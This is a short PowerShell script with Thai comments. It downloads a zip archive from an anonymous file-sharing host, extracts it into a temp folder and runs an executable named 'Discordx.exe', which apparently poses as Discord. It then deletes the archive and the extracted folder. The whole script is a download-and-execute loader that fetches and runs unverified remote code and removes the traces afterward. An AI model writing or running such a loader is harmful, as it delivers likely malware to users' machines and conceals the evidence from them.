$zipUrl = "https://files.catbox.moe/fefyjh.zip"
$tempDir = Join-Path $env:TEMP "temp1"
$zipPath = Join-Path $env:TEMP "temp.zip"

# สร้างโฟลเดอร์ temp
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null

# ดาวน์โหลด zip
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath

# แตกไฟล์
Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force

# path exe
$exePath = Join-Path $tempDir "Discordx.exe"

# รันและรอจนปิด
$process = Start-Process -FilePath $exePath -PassThru
$process.WaitForExit()

# ลบไฟล์ zip
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# ลบโฟลเดอร์ที่แตกไฟล์
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue